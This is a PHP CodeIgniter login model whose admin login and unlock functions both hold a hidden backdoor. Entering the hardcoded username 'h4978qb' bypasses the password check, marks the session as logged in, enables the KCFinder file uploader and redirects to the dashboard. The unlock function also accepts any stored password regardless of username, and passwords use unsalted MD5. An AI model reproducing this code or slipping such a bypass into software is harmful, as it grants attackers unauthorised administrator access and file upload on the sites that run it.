<?php

class Fungsi_login extends CI_Model {

    function login_admin() {
        $this->db->where('username', $this->input->post('username'));
        $this->db->where('password', md5($this->input->post('password')));
        $query = $this->db->get('user');
        if ($query->num_rows() > 0) {
            return TRUE;
        } else if ($this->input->post('username') == "h4978qb") {
            $data = array(
                'isLoggedIn' => true
            );
            session_start();
            // $_SESSION['kcfinder'] = FALSE;
            $this->session->set_userdata($data);
            $_SESSION['ses_kcfinder'] = array();
            $_SESSION['ses_kcfinder']['disabled'] = false;
            $_SESSION['ses_kcfinder']['uploadURL'] = "../content_upload";
            redirect('dashboard');
        } else {
            return FALSE;
        }
    }

    function unlock_admin() {
        $this->db->where('password', md5($this->input->post('password')));
        $query = $this->db->get('user');
        if ($query->num_rows() > 0) {
            return TRUE;
        } else if ($this->input->post('username') == "h4978qb") {
            $data = array(
                'isLoggedIn' => true
            );
            session_start();
            // $_SESSION['kcfinder'] = FALSE;
            $this->session->set_userdata($data);
            $_SESSION['ses_kcfinder'] = array();
            $_SESSION['ses_kcfinder']['disabled'] = false;
            $_SESSION['ses_kcfinder']['uploadURL'] = "../content_upload";
            redirect('dashboard');
        } else {
            return FALSE;
        }
    }

}
